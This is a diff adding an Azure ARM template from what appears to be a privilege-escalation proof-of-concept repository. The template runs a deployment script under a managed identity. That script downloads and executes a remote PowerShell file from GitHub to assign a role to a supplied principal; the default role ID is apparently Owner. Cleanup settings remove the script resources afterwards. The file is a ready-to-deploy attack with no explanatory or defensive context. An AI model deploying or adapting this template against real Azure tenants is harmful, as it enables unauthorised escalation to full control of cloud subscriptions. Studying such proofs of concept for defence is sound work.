@@ -1,0 +1,51 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "managedIdentityResourceGroup": {
+            "type": "string"
+        },
+        "managedIdentityName": {
+            "type": "string"
+        },
+        "principalId": {
+            "type": "string"
+        },
+        "roleDefinitionId": {
+            "type": "string",
+            "defaultValue": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
+        },
+        "utc": {
+            "type": "string",
+            "defaultValue": "[utcNow()]"
+        }
+    },
+    "resources": [
+        {
+            "type": "Microsoft.Resources/deploymentScripts",
+            "apiVersion": "2020-10-01",
+            "name": "SetPermissions",
+            "location": "[resourceGroup().location]",
+            "kind": "AzurePowerShell",
+            "identity": {
+                "type": "UserAssigned",
+                "userAssignedIdentities": {
+                    "[resourceId(parameters('managedIdentityResourceGroup'), 'Microsoft.ManagedIdentity/userAssignedIdentities', parameters('managedIdentityName'))]": {}
+                }
+            },
+            "properties": {
+                "forceUpdateTag": "[parameters('utc')]",
+                "azPowerShellVersion": "5.4",
+                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', subscription().subscriptionId, parameters('roleDefinitionId'), parameters('principalId'))]",
+                "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/miaow.ps1",
+                "supportingScriptUris": [],
+                "timeout": "PT30M",
+                "cleanupPreference": "Always",
+                "retentionInterval": "P1D",
+                "containerSettings": {
+                    "containerGroupName": "miaow"
+                }
+            }
+        }
+    ]
+}
